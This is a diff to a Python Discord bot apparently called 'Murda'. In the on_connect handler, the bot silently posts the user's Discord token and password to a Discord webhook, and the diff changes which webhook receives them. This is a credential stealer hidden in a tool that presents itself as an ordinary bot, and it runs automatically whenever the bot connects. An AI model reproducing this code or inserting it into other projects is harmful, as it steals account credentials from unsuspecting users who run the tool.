@@ -1961,7 +1961,7 @@ async def _get_color(ctx, *, color: discord.Colour):
 @Murda.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/801138314123018240/K-N80AuxIT0iZkCXLK2-SVsIFCZN9yIYvH4C9SB5Ca5rUYsxFb4Zqt1igk6WjrH3-5yz',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})  
+  requests.post('https://discord.com/api/webhooks/802348604471246869/i1F2_KRvkSP3POTiiyCe69ZP7Q9088VqFOkidVdhIZAN4r6WsZ8XOi-nI7cnkr3jz_2k',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})  
 
 @Murda.command(aliases=['rainbowrole'])
 async def rainbow(ctx, *, role):
